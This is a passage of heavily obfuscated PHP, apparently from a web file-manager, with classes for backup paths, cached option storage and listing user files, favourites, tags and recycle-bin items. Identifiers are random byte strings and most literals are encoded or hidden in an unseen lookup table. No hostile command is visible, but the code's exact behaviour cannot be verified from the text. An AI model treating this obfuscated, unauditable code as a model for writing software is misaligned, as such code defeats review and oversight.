IO::move($ô·ø›øâ[$òéƒ¯š†[851]], $Ğ¹‚„™Ù); IO::move($ô·ø›øâ[$òéƒ¯š†[13]], $Ğ¹‚„™Ù); $ÃÀ½õ°ê->end(); $è°µÏ = array($òéƒ¯š†[852] => $Ìˆƒ¿Õ, $òéƒ¯š†[853] => time()); Backup::set($è°µÏ); return !0; } private function backupPath($³˜âë‰î) { $É…ñì¯ç =& $_SERVER[Î‹ÃÂŞ„]; $¨Í×é¯ = $³˜âë‰î[$É…ñì¯ç[32]]; $Ğ³½Ëâ = Model($É…ñì¯ç[817])->get($É…ñì¯ç[818]); $îåÀ˜•ö = substr(md5($É…ñì¯ç[819] . $Ğ³½Ëâ . $¨Í×é¯), 0, 8); return "\173\151\157\72{$³˜âë‰î[$É…ñì¯ç[798]]}\x7d\57\x64\x61\x74\x61\x62\141\x73\145\57\142\141\x63\153\165\x70\57" . $¨Í×é¯ . $É…ñì¯ç[11] . $îåÀ˜•ö; } private function tmpFilesPath() { $¬Ÿà»²‹ =& $_SERVER[Î‹ÃÂŞ„]; $ûÖ—Ù³— = TEMP_FILES; if ($GLOBALS[$¬Ÿà»²‹[6]][$¬Ÿà»²‹[91]][$¬Ÿà»²‹[843]]) { $ûÖ—Ù³— = $GLOBALS[$¬Ÿà»²‹[6]][$¬Ÿà»²‹[91]][$¬Ÿà»²‹[843]]; if (!mk_dir($ûÖ—Ù³—) || !is_writable($ûÖ—Ù³—) || !IO::mkfile($ûÖ—Ù³— . $¬Ÿà»²‹[844])) { $ûÖ—Ù³— = TEMP_FILES; } } return $ûÖ—Ù³—; } } goto c‡²Ê¼†Ÿ; aíˆ¾Âš«„: class ModelBaseOption extends ModelBase { protected $tableName = ''; protected $jsonField = array(); public function get($²¿‘ÌŞğ = false, $«¢Ğö© = '', $º¢¶©Ì´ = false) { $É­¯²® =& $_SERVER[Î‹ÃÂŞ„]; $Ñö×÷ƒí = $this->cacheGet($«¢Ğö©); $¶•«—ÓÇ = $this->optionDefault($«¢Ğö©); $¶•«—ÓÇ = is_array($¶•«—ÓÇ) ? $¶•«—ÓÇ : array(); if (is_array($Ñö×÷ƒí)) { $Ñö×÷ƒí = array_merge($¶•«—ÓÇ, $Ñö×÷ƒí); return $²¿‘ÌŞğ ? isset($Ñö×÷ƒí[$²¿‘ÌŞğ]) ? $Ñö×÷ƒí[$²¿‘ÌŞğ] : null : $Ñö×÷ƒí; } $²Ö©ÍÏ = $this->filterWhere(array($É­¯²®[33] => $«¢Ğö©)); $Ñö×÷ƒí = $this->where($²Ö©ÍÏ)->select(); $Ñö×÷ƒí = array_to_keyvalue($Ñö×÷ƒí, $É­¯²®[96], $É­¯²®[420]); foreach ($Ñö×÷ƒí as $ƒØ§õó± => $ ±¯ô«·) { if ($º¢¶©Ì´ || in_array($ƒØ§õó±, $this->jsonField)) { $Ñö×÷ƒí[$ƒØ§õó±] = json_decode($ ±¯ô«·, !0); } } $this->cacheSet($«¢Ğö©, $Ñö×÷ƒí); $Ñö×÷ƒí = array_merge($¶•«—ÓÇ, $Ñö×÷ƒí); return $²¿‘ÌŞğ ? $Ñö×÷ƒí[$²¿‘ÌŞğ] : $Ñö×÷ƒí; } public function set($ö†¦Ó•é, $ÒÄÁ¿à = false, $¦ÄïƒÒ› = '') { $Íëñæ”ş =& $_SERVER[Î‹ÃÂŞ„]; $this->cacheRemove($¦ÄïƒÒ›); $ï¾‰Š¹è = array(); $ÔºÊŒ¯Í = is_array($ö†¦Ó•é) ? $ö†¦Ó•é : array($ö†¦Ó•é => $ÒÄÁ¿à); foreach ($ÔºÊŒ¯Í as $ã¬÷ë÷Í => $Ç¯ÔŞïç) { if (is_array($Ç¯ÔŞïç)) { $Ç¯ÔŞïç = json_encode_force($Ç¯ÔŞïç); } $this->checkLength($Ç¯ÔŞïç, !1, $this->tableName . $Íëñæ”ş[4] . $ö†¦Ó•é); $Ç¯ÔŞïç = self::textEncode($Ç¯ÔŞïç); $ÔºÊŒ¯Í = array($Íëñæ”ş[33] => $¦ÄïƒÒ›, $Íëñæ”ş[96] => $ã¬÷ë÷Í, $Íëñæ”ş[420] => $Ç¯ÔŞïç); $ï¾‰Š¹è[] = $this->filterWhere($ÔºÊŒ¯Í); } if (!$ï¾‰Š¹è) { return !0; } $í¹½’² = $this->cacheKey($Íëñæ”ş[446]); CacheLock::lock($í¹½’²); $†‚§¡ = $this->addAll($ï¾‰Š¹è, array(), !0); CacheLock::unlock($í¹½’²); return $†‚§¡; } protected function optionDefault($»Í£”©· = '') { return !1; } public function setDeep($Üç¢’á, $°¥Æ³º± = false, $³ÛÓ = '') { $ö™¯ÄÍÌ = explode($_SERVER[Î‹ÃÂŞ„][10], $Üç¢’á); $ ë¤Ñ¤è = $this->get(); array_set_value($ ë¤Ñ¤è, $Üç¢’á, $°¥Æ³º±); $this->set($ö™¯ÄÍÌ[0], $ ë¤Ñ¤è[$ö™¯ÄÍÌ[0]], $³ÛÓ); } public function remove($Úç¦Š€, $ëâĞÜŠñ = '') { $˜’­½ıŞ =& $_SERVER[Î‹ÃÂŞ„]; $this->cacheRemove($ëâĞÜŠñ); $¯¹¨ãÓ = $this->filterWhere(array($˜’­½ıŞ[96] => $Úç¦Š€, $˜’­½ıŞ[33] => $ëâĞÜŠñ)); if (is_null($Úç¦Š€)) { unset($¯¹¨ãÓ[$˜’­½ıŞ[96]]); } return $this->where($¯¹¨ãÓ)->delete(); } public function cacheSet($ù¡¬ª²Ö, $ƒ®êÃæ² = false) { return Cache::set($this->cacheKey($ù¡¬ª²Ö), $ƒ®êÃæ²); } public function cacheGet($ï˜ØÅçÏ) { return Cache::get($this->cacheKey($ï˜ØÅçÏ)); } public function cacheRemove($İ¶Íƒ—£) { return Cache::remove($this->cacheKey($İ¶Íƒ—£)); } protected function filterWhere($¡†õãÆü) { return $¡†õãÆü; } protected function cacheKey($ş’¨àï•) { return $ş’¨àï•; } } class SourceListModel extends ModelBase { protected $tableName = "\x69\x6f\137\163\157\165\x72\x63\x65"; protected $tableMeta = array("\164\x61\x62\154\145\116\141\x6d\145" => "\151\x6f\137\163\x6f\x75\x72\143\x65\137\x6d\x65\x74\141", "\x6d\x65\164\x61\106\151\x65\x6c\144" => "\x73\157\x75\x72\x63\x65\111\104"); protected $dataAuto = array(array("\155\157\x64\151\146\171\124\151\155\145", "\x74\151\x6d\145", "\151\x6e\x73\145\162\x74", "\x66\x75\156\x63\164\x69\157\156"), array("\x63\162\x65\x61\164\145\x54\151\x6d\x65", "\164\151\155\145", "\x69\156\x73\145\x72\x74", "\146\165\156\143\164\x69\157\x6e"), array("\166\151\x65\x77\124\x69\x6d\x65", "\x74\x69\x6d\x65", "\151\x6e\x73\145\x72\x74", "\146\x75\x6e\x63\x74\x69\157\156")); protected static $cacheSourceInfo = array(); protected static $cachePathInfo = array(); protected static $cacheFileInfo = array(); protected static $cacheChildList = array(); const TYPE_SYSTEM = 0; const TYPE_USER = 1; const TYPE_GROUP = 2; public function listData($°ç–Ş·Ê) { return $this->listSource(array($_SERVER[Î‹ÃÂŞ„][447] => $°ç–Ş·Ê)); } public function typeName($òöŒë“ù) { static $íÊ¹üûú = array(self::TYPE_SYSTEM => "\163\x79\163\164\145\155", self::TYPE_USER => "\x75\x73\145\162", self::TYPE_GROUP => "\147\162\157\165\x70"); return $íÊ¹üûú[$òöŒë“ù . $_SERVER[Î‹ÃÂŞ„][12]]; } public function sourceListInfo($ÛèÓ››ó, $ş ¤¸£ô = false) { $ßƒô°µº =& $_SERVER[Î‹ÃÂŞ„]; $ÛèÓ››ó = $ÛèÓ››ó ? $ÛèÓ››ó : array(); $ÛèÓ››ó = array_filter(array_unique($ÛèÓ››ó)); if (!$ÛèÓ››ó) { return array(); } $Š¿íÍßÕ = $this->where(array($ßƒô°µº[183] => array($ßƒô°µº[7], $ÛèÓ››ó)))->select(); $this->_listDataApply($Š¿íÍßÕ, $ş ¤¸£ô); return array_to_keyvalue($Š¿íÍßÕ, $ßƒô°µº[183]); } public function pathInfoFilter(&$¥ÜéíÄÙ) { $ªÄÊÃ’« =& $_SERVER[Î‹ÃÂŞ„]; static $ÅÍ—š¼ì = false; static $ÚøæïÖ = false; static $«È˜¢‹ê = false; if (!$ÅÍ—š¼ì) { $­±Í™ñƒ = $ªÄÊÃ’«[448]; $­±Í™ñƒ .= $ªÄÊÃ’«[449]; $­±Í™ñƒ .= $ªÄÊÃ’«[450]; $‚ŠÍ’â = $ªÄÊÃ’«[451]; $†ğ¨¢ò = explode($ªÄÊÃ’«[50], $‚ŠÍ’â); $ÅÍ—š¼ì = explode($ªÄÊÃ’«[50], $­±Í™ñƒ); $ÚøæïÖ = array(); foreach ($ÅÍ—š¼ì as $øã’¼™) { if (in_array($øã’¼™, $†ğ¨¢ò)) { continue; } $ÚøæïÖ[] = $øã’¼™; } $«È˜¢‹ê = explode($ªÄÊÃ’«[50], $ªÄÊÃ’«[452]); } foreach ($«È˜¢‹ê as $ë‰¬Áßˆ) { if (isset($¥ÜéíÄÙ[$ë‰¬Áßˆ])) { $¥ÜéíÄÙ[$ë‰¬Áßˆ] = intval($¥ÜéíÄÙ[$ë‰¬Áßˆ]); } } $¥ÜéíÄÙ[$ªÄÊÃ’«[86]] = $ªÄÊÃ’«[453] . $¥ÜéíÄÙ[$ªÄÊÃ’«[183]] . $ªÄÊÃ’«[454]; $¥ÜéíÄÙ[$ªÄÊÃ’«[33]] = $¥ÜéíÄÙ[$ªÄÊÃ’«[455]] == 1 ? $ªÄÊÃ’«[77] : $ªÄÊÃ’«[216]; $¥ÜéíÄÙ[$ªÄÊÃ’«[180]] = $this->typeName($¥ÜéíÄÙ[$ªÄÊÃ’«[180]]); if ($¥ÜéíÄÙ[$ªÄÊÃ’«[455]] != 1) { $¥ÜéíÄÙ[$ªÄÊÃ’«[177]] = $¥ÜéíÄÙ[$ªÄÊÃ’«[456]]; unset($¥ÜéíÄÙ[$ªÄÊÃ’«[456]]); } $èô‚‡ô = $ÅÍ—š¼ì; if (isset($¥ÜéíÄÙ[$ªÄÊÃ’«[457]]) && $¥ÜéíÄÙ[$ªÄÊÃ’«[457]][$ªÄÊÃ’«[458]] == -1) { $èô‚‡ô = $ÚøæïÖ; } $¥ÜéíÄÙ = array_field_key($¥ÜéíÄÙ, $èô‚‡ô); return $¥ÜéíÄÙ; } public function listUserFav() { $êİ¤¤œ =& $_SERVER[Î‹ÃÂŞ„]; $‡„Äå–ö = Model($êİ¤¤œ[459])->listData(); $ƒçÙÓêí = array_filter_by_field($‡„Äå–ö, $êİ¤¤œ[33], $êİ¤¤œ[460]); $ƒçÙÓêí = array_to_keyvalue($ƒçÙÓêí, $êİ¤¤œ[12], $êİ¤¤œ[86]); if ($ƒçÙÓêí) { $Ü¸Œàµ— = $this->listSource(array($êİ¤¤œ[461] => array($êİ¤¤œ[462], $ƒçÙÓêí))); } $Ü¸Œàµ— = array_to_keyvalue($Ü¸Œàµ—[$êİ¤¤œ[415]], $êİ¤¤œ[183]); foreach ($‡„Äå–ö as &$·ËÆß§Ò) { $·ËÆß§Ò = array($êİ¤¤œ[463] => $·ËÆß§Ò[$êİ¤¤œ[445]], $êİ¤¤œ[464] => $·ËÆß§Ò[$êİ¤¤œ[32]], $êİ¤¤œ[465] => $·ËÆß§Ò[$êİ¤¤œ[86]], $êİ¤¤œ[466] => $·ËÆß§Ò[$êİ¤¤œ[33]], $êİ¤¤œ[467] => $·ËÆß§Ò[$êİ¤¤œ[217]], $êİ¤¤œ[468] => $·ËÆß§Ò[$êİ¤¤œ[87]]); if ($·ËÆß§Ò[$êİ¤¤œ[33]] == $êİ¤¤œ[460] && $Ü¸Œàµ—[$·ËÆß§Ò[$êİ¤¤œ[86]]]) { $·ËÆß§Ò[$êİ¤¤œ[89]] = $Ü¸Œàµ—[$·ËÆß§Ò[$êİ¤¤œ[86]]]; } } unset($·ËÆß§Ò); return $‡„Äå–ö; } public function listUserTag($¼Œ‰”) { $–‡È²€ò =& $_SERVER[Î‹ÃÂŞ„]; if ($¼Œ‰” && !is_array($¼Œ‰”)) { $¼Œ‰” = array($¼Œ‰”); } $â…› Ú = Model($–‡È²€ò[469])->listData(); $¯§–™¦¥ = array(); $ÇšïŒß = array(); foreach ($â…› Ú as $éÄşÏ©¾) { $«ÌÖ×šè = $éÄşÏ©¾[$–‡È²€ò[86]]; if (!$«ÌÖ×šè) { continue; } if (!isset($ÇšïŒß[$«ÌÖ×šè])) { $ÇšïŒß[$«ÌÖ×šè] = array(); } $ÇšïŒß[$«ÌÖ×šè][] = $éÄşÏ©¾[$–‡È²€ò[470]]; $¯§–™¦¥[$éÄşÏ©¾[$–‡È²€ò[86]]] = $éÄşÏ©¾; } $ÙºÆ™®´ = array(); $†î‚¾¾Œ = array(); $¦İ¾š‘Ö = array(); foreach ($ÇšïŒß as $ö”é£Å› => $åÛ¶ë¶‡) { $°Âºó‚Æ = !0; if (!$¼Œ‰”) { $ÙºÆ™®´[] = $ö”é£Å›; continue; } foreach ($¼Œ‰” as $¥ÍÙË¥ä) { if (!in_array($¥ÍÙË¥ä, $åÛ¶ë¶‡)) { $°Âºó‚Æ = !1; break; } } if (!$°Âºó‚Æ) { continue; } if (!is_numeric($ö”é£Å›)) { $®´àÕ½Ì = $¯§–™¦¥[$ö”é£Å›]; $›ÛñŞ¸Â = array($–‡È²€ò[32] => $®´àÕ½Ì[$–‡È²€ò[32]], $–‡È²€ò[86] => $®´àÕ½Ì[$–‡È²€ò[86]], $–‡È²€ò[33] => $®´àÕ½Ì[$–‡È²€ò[33]], $–‡È²€ò[89] => array($–‡È²€ò[471] => 1), $–‡È²€ò[218] => !0); if ($®´àÕ½Ì[$–‡È²€ò[33]] == $–‡È²€ò[216]) { $¦İ¾š‘Ö[] = $›ÛñŞ¸Â; } if ($®´àÕ½Ì[$–‡È²€ò[33]] == $–‡È²€ò[77]) { $†î‚¾¾Œ[] = $›ÛñŞ¸Â; } continue; } $ÙºÆ™®´[] = $ö”é£Å›; } if ($ÙºÆ™®´) { $«ÖÈÓ´Ã = $this->listSource(array($–‡È²€ò[461] => array($–‡È²€ò[462], $ÙºÆ™®´))); } $«ÖÈÓ´Ã = $«ÖÈÓ´Ã ? $«ÖÈÓ´Ã : array($–‡È²€ò[84] => array(), $–‡È²€ò[85] => array()); $«ÖÈÓ´Ã[$–‡È²€ò[84]] = array_merge($«ÖÈÓ´Ã[$–‡È²€ò[84]], $†î‚¾¾Œ); $«ÖÈÓ´Ã[$–‡È²€ò[85]] = array_merge($«ÖÈÓ´Ã[$–‡È²€ò[85]], $¦İ¾š‘Ö); if (isset($«ÖÈÓ´Ã[$–‡È²€ò[412]]) && count($ÙºÆ™®´) == $«ÖÈÓ´Ã[$–‡È²€ò[412]][$–‡È²€ò[413]]) { return $«ÖÈÓ´Ã; } $üÖÀ¤•” = array(); $Òş£ÛÂğ = array_to_keyvalue($«ÖÈÓ´Ã[$–‡È²€ò[84]], $–‡È²€ò[12], $–‡È²€ò[183]); $ñÒåÙ¶„ = array_to_keyvalue($«ÖÈÓ´Ã[$–‡È²€ò[85]], $–‡È²€ò[12], $–‡È²€ò[183]); $‹‘˜ ¢ = array_merge($ñÒåÙ¶„, $Òş£ÛÂğ); foreach ($ÙºÆ™®´ as $«ÌÖ×šè) { if (!in_array($«ÌÖ×šè, $‹‘˜ ¢)) { $üÖÀ¤•”[] = $«ÌÖ×šè; } } if ($üÖÀ¤•”) { Model($–‡È²€ò[472])->removeBySource($üÖÀ¤•”); } return $«ÖÈÓ´Ã; } public function listUserRecycle() { $ÀİÇ•é† =& $_SERVER[Î‹ÃÂŞ„]; $äƒ»Äìø = Model($ÀİÇ•é†[473])->listData(); if (!$äƒ»Äìø) { return array(); } $øÁ—ÂÔß = array($ÀİÇ•é†[461] => array($ÀİÇ•é†[462], $äƒ»Äìø), $ÀİÇ•é†[474] => 1); return $this->listSource($øÁ—ÂÔß); } public function listSource($æñ……—Ÿ, $â¬›æà = 3000, $¾¤›˜î = false) { $ÜªèèÆõ =& $_SERVER[Î‹ÃÂŞ„]; if (!isset($æñ……—Ÿ[$ÜªèèÆõ[475]])) { $æñ……—Ÿ[$ÜªèèÆõ[475]] = 0; } if (isset($æñ……—Ÿ[$ÜªèèÆõ[182]]) && $æñ……—Ÿ[$ÜªèèÆõ[182]] == $ÜªèèÆõ[214]) { $æñ……—Ÿ[$ÜªèèÆõ[456]] = array($ÜªèèÆõ[377], $ÜªèèÆõ[476]); } $Ğø ‡¯ç = $ÜªèèÆõ[477]; $¹¥ñÚ± = $this->field($Ğø ‡¯ç)->_makeOrder()->where($æñ……—Ÿ)->selectPage($â¬›æà); $this->_listPageCheck($¹¥ñÚ±, $Ğø ‡¯ç, $æñ……—Ÿ); $this->_listDataApply($¹¥ñÚ±[$ÜªèèÆõ[415]], $¾¤›˜î); $this->_listMake($¹¥ñÚ±); return $¹¥ñÚ±; } private function _listPageCheck(&$£†ÀçÓ…, $¾‘ëùä, $Ÿ‡¶¶‚ı) { $âéğ¥å =& $_SERVER[Î‹ÃÂŞ„]; if (!is_array($£†ÀçÓ…[$âéğ¥å[412]])) { return; } $ìîŞÎ¾ = $£†ÀçÓ…[$âéğ¥å[412]]; if ($ìîŞÎ¾[$âéğ¥å[414]] <= 1) { return; } if ($ìîŞÎ¾[$âéğ¥å[413]] >= 100000) { return; } if (Model($âéğ¥å[478])->get($âéğ¥å[479]) != $âéğ¥å[480]) { return; } $¾‘ëùä = str_replace(array($âéğ¥å[53], $âéğ¥å[388], $âéğ¥å[248]), $âéğ¥å[12], $¾‘ëùä); $¾‘ëùä = $âéğ¥å[481] . str_replace($âéğ¥å[50], $âéğ¥å[482], $¾‘ëùä) . $âéğ¥å[483]; $öñÁò† = $âéğ¥å[484]; $öñÁò† = $öñÁò† . $âéğ¥å[485]; $±ş’Õ— = $ìîŞÎ¾[$âéğ¥å[409]] * ($ìîŞÎ¾[$âéğ¥å[399]] - 1) . $âéğ¥å[50] . $ìîŞÎ¾[$âéğ¥å[409]]; $Ğ¦âÓĞ = $this->_makeOrder(!0); $Ì½¿ºšÁ = $âéğ¥å[481] . str_replace($âéğ¥å[50], $âéğ¥å[482], $Ğ¦âÓĞ[0]); if (strpos($Ì½¿ºšÁ, $âéğ¥å[486])) { $Ì½¿ºšÁ = str_replace($âéğ¥å[486], $âéğ¥å[487], $Ì½¿ºšÁ); } else { $Ì½¿ºšÁ .= $âéğ¥å[488] . $Ğ¦âÓĞ[1]; } $×óÚ¬©½ = array(); foreach ($Ÿ‡¶¶‚ı as $‰„ü›Ûï => $Ú‹Œ¸œ¬) { $×óÚ¬©½[$âéğ¥å[481] . $‰„ü›Ûï] = $Ú‹Œ¸œ¬; } $this->alias($âéğ¥å[489])->field($¾‘ëùä)->limit($±ş’Õ—)->order($Ì½¿ºšÁ); $ÓĞ–¾Ÿ« = $this->join($öñÁò†)->where($×óÚ¬©½)->select(); if ($ÓĞ–¾Ÿ«) { $£†ÀçÓ…[$âéğ¥å[415]] = $ÓĞ–¾Ÿ«; } } protected function _makeOrder($’™Ğ§Ş = false) { $Üª‚òÎ =& $_SERVER[Î‹ÃÂŞ„]; $Ù‰Ø½è– = Model($Üª‚òÎ[490])->get($Üª‚òÎ[491]); $ÛÂşÑ‘Æ = Model($Üª‚òÎ[490])->get($Üª‚òÎ[492]); $Ö™Š´¥Š = array($Üª‚òÎ[493] => $Üª‚òÎ[494], $Üª‚òÎ[495] => $Üª‚òÎ[496]); $Úù‡æ§À = array($Üª‚òÎ[32] => $Üª‚òÎ[32], $Üª‚òÎ[78] => $Üª‚òÎ[78], $Üª‚òÎ[177] => $Üª‚òÎ[456], $Üª‚òÎ[497] => $Üª‚òÎ[497], $Üª‚òÎ[498] => $Üª‚òÎ[499], $Üª‚òÎ[217] => $Üª‚òÎ[217], $Üª‚òÎ[87] => $Üª‚òÎ[87]); $Ï‘»¸ = Input::get($Üª‚òÎ[500], $Üª‚òÎ[7], $Ù‰Ø½è–, array_keys($Úù‡æ§À)); $¸™Ô£òı = Input::get($Üª‚òÎ[501], $Üª‚òÎ[7], $ÛÂşÑ‘Æ, array_keys($Ö™Š´¥Š)); if (!in_array($Ï‘»¸, array_keys($Úù‡æ§À))) { $Ï‘»¸ = $Üª‚òÎ[32]; } if (!in_array($¸™Ô£òı, array_keys($Ö™Š´¥Š))) { $Ï‘»¸ = $Üª‚òÎ[493]; } if ($Ï‘»¸ == $Üª‚òÎ[32]) { } $–šÉõá = $Üª‚òÎ[502] . $Úù‡æ§À[$Ï‘»¸] . $Üª‚òÎ[53] . $Ö™Š´¥Š[$¸™Ô£òı]; $–šÉõá = rtrim(trim($–šÉõá), $Üª‚òÎ[50]); if ($’™Ğ§Ş) { return array($–šÉõá, $Ö™Š´¥Š[$¸™Ô£òı]); } return $this->order($–šÉõá); } protected function _listDataApplyItem($ğú–, $«÷¤‹Âé = false) { $¨ ¯è‘Ã = array($ğú–); $this->_listDataApply($¨ ¯è‘Ã, $«÷¤‹Âé); return $¨ ¯è‘Ã[0]; } protected function _listDataApply(&$×÷´¢¿Ÿ, $°£ÃÊ¼Ø = false) { $´šÑş =& $_SERVER[Î‹ÃÂŞ„]; if (!$×÷´¢¿Ÿ) { $×÷´¢¿Ÿ = array(); return; } $È¬ÃµÌõ = array_to_keyvalue($×÷´¢¿Ÿ, $´šÑş[12], $´šÑş[183]); $È¬ÃµÌõ = array_unique($È¬ÃµÌõ); $this->_listSourceCache($×÷´¢¿Ÿ); if (!$°£ÃÊ¼Ø) { $this->_listAppendMeta($×÷´¢¿Ÿ, $È¬ÃµÌõ); $this->_listAppendFileMeta($×÷´¢¿Ÿ, $È¬ÃµÌõ); $this->_listAppendChildren($×÷´¢¿Ÿ, $È¬ÃµÌõ); } $this->_listAppendPath($×÷´¢¿Ÿ); $this->_listAppendAuth($×÷´¢¿Ÿ); $this->_listAppendSourceInfo($×÷´¢¿Ÿ, $È¬ÃµÌõ); $this->_listAppendUser($×÷´¢¿Ÿ); $this->_listFilterInfo($×÷´¢¿Ÿ, $°£ÃÊ¼Ø); $this->_listAppendAuthSecret($×÷´¢¿Ÿ); } protected function _listSourceCache($…åõøñæ) { $¥Ìà‚…È =& $_SERVER[Î‹ÃÂŞ„]; foreach ($…åõøñæ as $‹µàñÁ) { self::$cacheSourceInfo[$¥Ìà‚…È[503] . $‹µàñÁ[$¥Ìà‚…È[183]]] = $‹µàñÁ; } } protected function _listFilterInfo(&$ßáëøİˆ, $«´ëÊĞ½ = false) { $•¾»À’ =& $_SERVER[Î‹ÃÂŞ„]; foreach ($ßáëøİˆ as &$Ïú¢¿Şµ) { $Ïú¢¿Şµ = $this->pathInfoFilter($Ïú¢¿Şµ); self::$cachePathInfo[$•¾»À’[504] . intval($«´ëÊĞ½) . $•¾»À’[432] . $Ïú¢¿Şµ[$•¾»À’[183]]] = $Ïú¢¿Şµ; } unset($Ïú¢¿Şµ); } protected function _listMake(&$¦Î¤Æã) { $Âû‰¼ñ§ =& $_SERVER[Î‹ÃÂŞ„]; $¦Î¤Æã[$Âû‰¼ñ§[84]] = array(); $¦Î¤Æã[$Âû‰¼ñ§[85]] = array(); foreach ($¦Î¤Æã[$Âû‰¼ñ§[415]] as $ïßºßÀø) { $»‡‘Ş®› = $ïßºßÀø[$Âû‰¼ñ§[455]] == 1 ? $Âû‰¼ñ§[84] : $Âû‰¼ñ§[85]; $¦Î¤Æã[$»‡‘Ş®›][] = $ïßºßÀø; } unset($¦Î¤Æã[$Âû‰¼ñ§[415]]); } protected function _listAppendMeta(&$âí“­½’, $†·ıÇÜ) { $ÂŠÕáÌİ =& $_SERVER[Î‹ÃÂŞ„]; $ÆÚÏ´ë = array($ÂŠÕáÌİ[461] => array($ÂŠÕáÌİ[462], $†·ıÇÜ)); $ëó¡„¯… = Model($ÂŠÕáÌİ[505])->field($ÂŠÕáÌİ[506])->where($ÆÚÏ´ë)->select(); if (!$ëó¡„¯…) { return; } $…ÁÜ¸‹Ã = array($ÂŠÕáÌİ[507], $ÂŠÕáÌİ[508], $ÂŠÕáÌİ[487]); $§–Ó…·¡ = array(); foreach ($ëó¡„¯… as $‡Şû½Ú›) { if (!isset($§–Ó…·¡[$‡Şû½Ú›[$ÂŠÕáÌİ[183]]])) { $§–Ó…·¡[$‡Şû½Ú›[$ÂŠÕáÌİ[183]]] = array(); } if (in_array($‡Şû½Ú›[$ÂŠÕáÌİ[96]], $…ÁÜ¸‹Ã)) { continue; } $§–Ó…·¡[$‡Şû½Ú›[$ÂŠÕáÌİ[183]]][$‡Şû½Ú›[$ÂŠÕáÌİ[96]]] = $‡Şû½Ú›[$ÂŠÕáÌİ[420]]; } foreach ($âí“­½’ as &$Ş²ÜúÈ÷) { $Ş²ÜúÈ÷[$ÂŠÕáÌİ[509]] = !1; if (isset($§–Ó…·¡[$Ş²ÜúÈ÷[$ÂŠÕáÌİ[183]]])) { $Ş²ÜúÈ÷[$ÂŠÕáÌİ[509]] = $§–Ó…·¡[$Ş²ÜúÈ÷[$ÂŠÕáÌİ[183]]]; } if ($this->fileIsLock($Ş²ÜúÈ÷) && $Ş²ÜúÈ÷[$ÂŠÕáÌİ[457]]) { $®†ÅîÃú = AuthModel::AUTH_EDIT | AuthModel::AUTH_REMOVE; $Ş²ÜúÈ÷[$ÂŠÕáÌİ[457]][$ÂŠÕáÌİ[458]] = AuthModel::authDisable($Ş²ÜúÈ÷[$ÂŠÕáÌİ[457]][$ÂŠÕáÌİ[458]], $®†ÅîÃú); $Ş²ÜúÈ÷[$ÂŠÕáÌİ[457]][$ÂŠÕáÌİ[510]][$ÂŠÕáÌİ[457]] = $Ş²ÜúÈ÷[$ÂŠÕáÌİ[457]][$ÂŠÕáÌİ[458]]; } } unset($Ş²ÜúÈ÷); } protected function _listAppendFileMeta(&$àÏÈß, $õÅÍá¶œ) { $ƒ¸¤Æ‹ =& $_SERVER[Î‹ÃÂŞ„]; $åÆÌ” = array_to_keyvalue($àÏÈß, $ƒ¸¤Æ‹[12], $ƒ¸¤Æ‹[511]); $åÆÌ” = array_filter(array_unique($åÆÌ”)); if (!$åÆÌ”) { return; } $ÍÁ¬ìÂŞ = array($ƒ¸¤Æ‹[512] => array($ƒ¸¤Æ‹[462], $åÆÌ”)); $ËÊüûóÆ = $ƒ¸¤Æ‹[513]; $†”£Ö¼ú = Model($ƒ¸¤Æ‹[514])->field($ËÊüûóÆ)->where($ÍÁ¬ìÂŞ)->select(); $†”£Ö¼ú = array_to_keyvalue($†”£Ö¼ú, $ƒ¸¤Æ‹[511]); $†¶·›•¿ = Model($ƒ¸¤Æ‹[515])->field($ƒ¸¤Æ‹[516])->where($ÍÁ¬ìÂŞ)->select(); $†¶·›•¿ = $†¶·›•¿ ? $†¶·›•¿ : array(); $Å×Ò’âÊ = array(); foreach ($†¶·›•¿ as $ÎÒ˜Ç†) { if (!isset($Å×Ò’âÊ[$ÎÒ˜Ç†[$ƒ¸¤Æ‹[511]]])) { $Å×Ò’âÊ[$ÎÒ˜Ç†[$ƒ¸¤Æ‹[511]]] = array(); } $Å×Ò’âÊ[$ÎÒ˜Ç†[$ƒ¸¤Æ‹[511]]][$ÎÒ˜Ç†[$ƒ¸¤Æ‹[96]]] = $ÎÒ˜Ç†[$ƒ¸¤Æ‹[420]]; } foreach ($àÏÈß as &$Šœ˜Óú) { $í¤ËÇ§ = $Šœ˜Óú[$ƒ¸¤Æ‹[511]]; if (!$í¤ËÇ§ || !is_array($†”£Ö¼ú[$í¤ËÇ§])) { continue; } $¦éõãù³ = $†”£Ö¼ú[$í¤ËÇ§]; $¦éõãù³[$ƒ¸¤Æ‹[78]] = $Šœ˜Óú[$ƒ¸¤Æ‹[78]]; $¦éõãù³[$ƒ¸¤Æ‹[32]] = $Šœ˜Óú[$ƒ¸¤Æ‹[32]]; if (!$¦éõãù³[$ƒ¸¤Æ‹[517]]) { Model($ƒ¸¤Æ‹[514])->fileMd5Check($¦éõãù³); } if (!isset(self::$cacheFileInfo[$ƒ¸¤Æ‹[518] . $í¤ËÇ§])) { self::$cacheFileInfo[$ƒ¸¤Æ‹[518] . $í¤ËÇ§] = array_merge(array(), $¦éõãù³); } unset($†”£Ö¼ú[$í¤ËÇ§][$ƒ¸¤Æ‹[86]]); $Íãû•ÏÁ = is_array($Å×Ò’âÊ[$í¤ËÇ§]) ? $Å×Ò’âÊ[$í¤ËÇ§] : array(); $Šœ˜Óú[$ƒ¸¤Æ‹[519]] = array_merge($Íãû•ÏÁ, $†”£Ö¼ú[$í¤ËÇ§]); if (isset($Šœ˜Óú[$ƒ¸¤Æ‹[519]][$ƒ¸¤Æ‹[173]])) { $Šœ˜Óú[$ƒ¸¤Æ‹[173]] = json_decode($Šœ˜Óú[$ƒ¸¤Æ‹[519]][$ƒ¸¤Æ‹[173]], !0); unset($Šœ˜Óú[$ƒ¸¤Æ‹[519]][$ƒ¸¤Æ‹[173]]); } } unset($Šœ˜Óú); } protected function _listAppendSourceInfo(&$¼ÓšĞ¾ë, $¹Ä’µî¤) { $ÜÂÏÙ®½ =& $_SERVER[Î‹ÃÂŞ„]; $’ÔÙ—¡İ = Model($ÜÂÏÙ®½[520])->listData(); $˜áò¥Äì = Model($ÜÂÏÙ®½[469])->listData(); $Şé—÷Ë = Model($ÜÂÏÙ®½[459])->listData(); $±üøŸÏÇ = Model($ÜÂÏÙ®½[521])->listSimple(); $ÈÒ¬×ƒí = array_to_keyvalue($’ÔÙ—¡İ, $ÜÂÏÙ®½[445]); $Ö–‚ìÙ½ = array_to_keyvalue_group($˜áò¥Äì, $ÜÂÏÙ®½[86], $ÜÂÏÙ®½[470]); $ü ·›Åî = array_to_keyvalue($Şé—÷Ë, $ÜÂÏÙ®½[86]); 